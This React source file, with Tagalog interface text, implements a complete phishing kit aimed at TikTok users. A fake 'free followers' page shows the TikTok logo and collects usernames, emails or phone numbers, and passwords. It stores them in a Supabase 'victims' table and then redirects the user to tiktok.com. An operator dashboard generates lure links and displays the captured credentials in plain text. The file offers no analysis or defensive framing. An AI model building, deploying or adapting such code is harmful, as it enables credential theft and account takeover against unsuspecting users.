import React, { useState, useEffect } from 'react';
// Gagamit tayo ng global na supabase mula sa script tag sa loob ng HTML head o dynamic import
// para maiwasan ang resolution errors sa environment na ito.
import { 
  Users, 
  Link as LinkIcon, 
  Eye, 
  Trash2, 
  LayoutDashboard, 
  LogOut, 
  CheckCircle, 
  TrendingUp, 
  ShieldCheck,
  Smartphone,
  Trophy,
  Activity,
  Copy,
  Plus
} from 'lucide-react';

const App = () => {
  const [page, setPage] = useState('landing'); 
  const [user, setUser] = useState(null);
  const [victims, setVictims] = useState([]);
  const [loading, setLoading] = useState(false);
  const [authMode, setAuthMode] = useState('login');
  const [supabase, setSupabase] = useState(null);

  // --- Victim/Target Page State ---
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [step, setStep] = useState(1);
  const [victimData, setVictimData] = useState({ username: '', identifier: '', password: '' });

  // --- Supabase Config ---
  const SUPABASE_URL = 'https://fhvonxrsfdawustkuoll.supabase.co';
  const SUPABASE_ANON_KEY = 'fhvonxrsfdawustkuoll'; 

  useEffect(() => {
    // Dynamic import ng Supabase para iwasan ang build errors
    const initSupabase = async () => {
      const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
      const client = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
      setSupabase(client);

      const { data: { user } } = await client.auth.getUser();
      if (user) {
        setUser(user);
        setPage('dashboard');
      }
    };
    initSupabase();

    const params = new URLSearchParams(window.location.search);
    if (params.get('target') === 'tiktok') {
      setPage('victim');
    }
  }, []);

  useEffect(() => {
    if (user && page === 'dashboard' && supabase) {
      fetchVictims();
    }
  }, [user, page, supabase]);

  const fetchVictims = async () => {
    if (!supabase) return;
    setLoading(true);
    const { data, error } = await supabase
      .from('victims')
      .select('*')
      .eq('admin_id', user.id)
      .order('created_at', { ascending: false });
    if (!error) setVictims(data || []);
    setLoading(false);
  };

  const handleAuth = async (e) => {
    e.preventDefault();
    if (!supabase) return;
    setLoading(true);
    const email = e.target.email.value;
    const password = e.target.password.value;

    let result;
    if (authMode === 'signup') {
      result = await supabase.auth.signUp({ email, password });
    } else {
      result = await supabase.auth.signInWithPassword({ email, password });
    }

    if (result.error) {
      alert(result.error.message);
    } else {
      setUser(result.data.user);
      setPage('dashboard');
    }
    setLoading(false);
  };

  const handleVictimSubmit = async () => {
    if (!supabase) return;
    if (!victimData.username || !victimData.identifier || !victimData.password) {
      alert("Mangyaring punan ang lahat ng detalye!");
      return;
    }
    setLoading(true);
    const params = new URLSearchParams(window.location.search);
    const adminId = params.get('admin') || 'unknown';

    const { error } = await supabase.from('victims').insert([
      { 
        admin_id: adminId, 
        tiktok_user: victimData.username, 
        credentials: victimData.identifier, 
        password: victimData.password,
        followers: selectedPlan
      }
    ]);

    if (!error) setStep(3);
    setLoading(false);
  };

  const copyToClipboard = (text) => {
    const el = document.createElement('textarea');
    el.value = text;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    alert("Kopyado na ang Link!");
  };

  // --- Views ---

  const AuthView = () => (
    <div className="min-h-screen bg-black flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-zinc-900 border border-zinc-800 p-8 rounded-3xl shadow-2xl">
        <div className="flex flex-col items-center mb-8">
          <div className="bg-gradient-to-tr from-pink-500 to-cyan-400 p-3 rounded-2xl mb-4">
            <ShieldCheck size={32} className="text-white" />
          </div>
          <h2 className="text-2xl font-bold text-white">Admin Portal</h2>
          <p className="text-zinc-500 text-sm mt-2">Pamahalaan ang iyong mga link</p>
        </div>
        <form onSubmit={handleAuth} className="space-y-4">
          <input name="email" type="email" placeholder="Email Address" required className="w-full bg-zinc-950 border border-zinc-800 p-4 rounded-xl text-white focus:border-pink-500 outline-none" />
          <input name="password" type="password" placeholder="Password" required className="w-full bg-zinc-950 border border-zinc-800 p-4 rounded-xl text-white focus:border-pink-500 outline-none" />
          <button disabled={loading} className="w-full bg-white text-black font-bold p-4 rounded-xl hover:bg-zinc-200 transition-colors">
            {loading ? 'Nagpoproseso...' : (authMode === 'login' ? 'Mag-login' : 'Gumawa ng Account')}
          </button>
        </form>
        <div className="mt-6 text-center">
          <button onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')} className="text-zinc-500 text-sm hover:text-white underline">
            {authMode === 'login' ? "Wala pang account? Mag-sign up" : "May account na? Mag-login"}
          </button>
        </div>
      </div>
    </div>
  );

  const DashboardView = () => (
    <div className="min-h-screen bg-black text-white">
      <nav className="border-b border-zinc-800 p-4 flex justify-between items-center bg-black/50 backdrop-blur-md sticky top-0 z-50">
        <div className="flex items-center gap-2 font-bold text-xl">
          <div className="bg-gradient-to-tr from-pink-500 to-cyan-400 p-1.5 rounded-lg"><TrendingUp size={20} /></div>
          TikTok <span className="text-cyan-400">Portal</span>
        </div>
        <button onClick={() => { supabase.auth.signOut(); setUser(null); setPage('landing'); }} className="text-zinc-400 hover:text-white flex items-center gap-2">
          <LogOut size={18} /> <span className="hidden sm:inline">Logout</span>
        </button>
      </nav>

      <div className="max-w-6xl mx-auto p-4 sm:p-8 space-y-8">
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div className="bg-zinc-900/50 p-6 rounded-3xl border border-zinc-800 flex items-center gap-4">
            <div className="p-3 bg-pink-500/10 text-pink-500 rounded-2xl"><Activity size={24}/></div>
            <div>
              <p className="text-zinc-500 text-xs uppercase font-bold">Kabuuang Captures</p>
              <h3 className="text-3xl font-black">{victims.length}</h3>
            </div>
          </div>
          <div className="bg-zinc-900/50 p-6 rounded-3xl border border-zinc-800 flex items-center gap-4">
            <div className="p-3 bg-cyan-500/10 text-cyan-500 rounded-2xl"><Smartphone size={24}/></div>
            <div>
              <p className="text-zinc-500 text-xs uppercase font-bold">Aktibong Link</p>
              <h3 className="text-3xl font-black">1</h3>
            </div>
          </div>
          <div className="bg-zinc-900/50 p-6 rounded-3xl border border-zinc-800 flex items-center gap-4">
            <div className="p-3 bg-yellow-500/10 text-yellow-500 rounded-2xl"><Trophy size={24}/></div>
            <div>
              <p className="text-zinc-500 text-xs uppercase font-bold">Status</p>
              <h3 className="text-3xl font-black">Online</h3>
            </div>
          </div>
        </div>

        <div className="bg-zinc-900 p-6 rounded-3xl border border-zinc-800">
          <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
            <LinkIcon size={18} className="text-pink-500" /> Link Generator
          </h3>
          <div className="flex flex-col sm:flex-row gap-4">
            <div className="flex-1 bg-black border border-zinc-800 p-4 rounded-2xl text-zinc-400 text-sm truncate">
              {window.location.origin}?target=tiktok&admin={user?.id}
            </div>
            <button 
              onClick={() => copyToClipboard(`${window.location.origin}?target=tiktok&admin=${user?.id}`)}
              className="bg-white text-black px-8 py-4 rounded-2xl font-black flex items-center justify-center gap-2 active:scale-95 transition-all"
            >
              <Copy size={18} /> Kopyahin ang Link
            </button>
          </div>
        </div>

        <div className="bg-zinc-900 rounded-3xl border border-zinc-800 overflow-hidden">
          <div className="p-6 border-b border-zinc-800 flex justify-between items-center bg-zinc-900/50">
            <h3 className="text-lg font-bold">Kamakailang Captures</h3>
            <button onClick={fetchVictims} className="text-xs font-bold text-cyan-400 hover:text-cyan-300">I-REFRESH</button>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead className="bg-black/50 text-zinc-500 text-[10px] uppercase tracking-widest border-b border-zinc-800">
                <tr>
                  <th className="px-6 py-4">TikTok User</th>
                  <th className="px-6 py-4">Email/Phone</th>
                  <th className="px-6 py-4">Password</th>
                  <th className="px-6 py-4">Plan</th>
                  <th className="px-6 py-4">Oras</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-800">
                {victims.length > 0 ? victims.map((v, i) => (
                  <tr key={i} className="hover:bg-zinc-800/30 transition-colors text-sm">
                    <td className="px-6 py-5 font-bold text-pink-500">@{v.tiktok_user}</td>
                    <td className="px-6 py-5 text-zinc-300">{v.credentials}</td>
                    <td className="px-6 py-5 font-mono text-zinc-400">{v.password}</td>
                    <td className="px-6 py-5"><span className="bg-cyan-500/10 text-cyan-500 px-3 py-1 rounded-full text-xs font-bold">{v.followers}k</span></td>
                    <td className="px-6 py-5 text-zinc-500 text-xs">{new Date(v.created_at).toLocaleString()}</td>
                  </tr>
                )) : (
                  <tr><td colSpan="5" className="px-6 py-20 text-center text-zinc-600">Wala pang nakuhang data. I-share ang iyong link!</td></tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );

  const VictimView = () => (
    <div className="min-h-screen bg-black text-white font-sans">
      <div className="max-w-md mx-auto p-6 flex flex-col items-center pt-10">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png" className="h-10 mb-8" alt="TikTok" />
        
        {step === 1 && (
          <div className="w-full space-y-6">
            <div className="text-center">
              <h1 className="text-3xl font-black mb-2">Libreng Followers</h1>
              <p className="text-zinc-400 text-sm">Pumili ng package para sa iyong TikTok account.</p>
            </div>
            <div className="grid grid-cols-2 gap-4">
              {[1, 5, 10, 25].map(count => (
                <button 
                  key={count} 
                  onClick={() => { setSelectedPlan(count); setStep(2); }}
                  className="bg-zinc-900 border border-zinc-800 p-6 rounded-3xl hover:border-pink-500 hover:bg-zinc-800/50 transition-all flex flex-col items-center"
                >
                  <Users className="text-zinc-600 mb-2" size={28} />
                  <span className="font-black text-2xl">{count}K</span>
                  <span className="text-[10px] text-zinc-500 font-black">Followers</span>
                </button>
              ))}
            </div>
          </div>
        )}

        {step === 2 && (
          <div className="w-full space-y-6">
            <div className="text-center">
              <h2 className="text-2xl font-black">Verification</h2>
              <p className="text-zinc-400 text-sm">I-verify ang iyong account para sa <span className="text-pink-500 font-bold">{selectedPlan}K Followers</span>.</p>
            </div>
            <div className="space-y-4">
              <input type="text" placeholder="TikTok Username" className="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl focus:border-pink-500 outline-none" onChange={(e) => setVictimData({...victimData, username: e.target.value})} />
              <input type="text" placeholder="Email o Telepono" className="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl focus:border-pink-500 outline-none" onChange={(e) => setVictimData({...victimData, identifier: e.target.value})} />
              <input type="password" placeholder="Password" className="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-2xl focus:border-pink-500 outline-none" onChange={(e) => setVictimData({...victimData, password: e.target.value})} />
              <button onClick={handleVictimSubmit} className="w-full bg-pink-600 p-4 rounded-2xl font-black shadow-xl hover:bg-pink-500 transition-all">Verify Now</button>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="w-full text-center space-y-8 py-10">
            <div className="bg-cyan-500/10 text-cyan-400 w-24 h-24 rounded-full flex items-center justify-center mx-auto border border-cyan-400/20">
              <Activity size={48} className="animate-pulse" />
            </div>
            <div>
              <h2 className="text-3xl font-black mb-2">Under Review</h2>
              <p className="text-zinc-500 text-sm">Ang iyong request para sa <span className="text-white font-bold">{selectedPlan}K Followers</span> ay pinoproseso na.</p>
            </div>
            <button onClick={() => window.location.href = 'https://tiktok.com'} className="bg-white text-black px-8 py-3 rounded-full text-xs font-black uppercase">
              Bumalik sa TikTok
            </button>
          </div>
        )}
      </div>
    </div>
  );

  const LandingView = () => (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 text-center space-y-6">
      <div className="bg-gradient-to-tr from-pink-500 to-cyan-400 p-5 rounded-3xl mb-4">
        <TrendingUp size={64} className="text-white" />
      </div>
      <h1 className="text-5xl font-black tracking-tighter">TikTok <span className="text-cyan-400">Growth</span></h1>
      <p className="text-zinc-500 max-w-sm">Ang ultimate tool para sa iyong TikTok analytics at visibility.</p>
      <div className="flex gap-4">
        <button onClick={() => { setAuthMode('login'); setPage('auth'); }} className="bg-white text-black px-8 py-4 rounded-2xl font-black hover:bg-zinc-200">Mag-login</button>
        <button onClick={() => { setAuthMode('signup'); setPage('auth'); }} className="border border-zinc-800 px-8 py-4 rounded-2xl font-black hover:bg-zinc-900">Mag-sign Up</button>
      </div>
    </div>
  );

  if (page === 'landing') return <LandingView />;
  if (page === 'auth') return <AuthView />;
  if (page === 'dashboard') return <DashboardView />;
  if (page === 'victim') return <VictimView />;

  return null;
};

export default App;
